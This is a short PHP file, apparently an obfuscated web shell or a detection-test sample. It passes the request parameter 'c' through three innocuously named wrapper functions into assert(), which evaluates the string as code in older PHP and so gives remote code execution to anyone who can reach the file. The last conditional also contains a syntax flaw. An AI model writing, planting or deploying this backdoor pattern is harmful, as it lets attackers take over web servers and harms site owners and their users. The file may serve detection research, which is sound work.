<?php 
	function FunctionOk3($value)
	{
		# code
		assert($value);
	}

	function FunctionOk2($value)
	{
		# code
		FunctionOk3($value);
	}

	function FunctionOk($value)
	{
		# code
		FunctionOk2($value);
	}
	
	
	FunctionOk($_REQUEST["c"]);

	if ($title !="aa")
	{FunctionOk($_REQUEST["c"])};
?> 
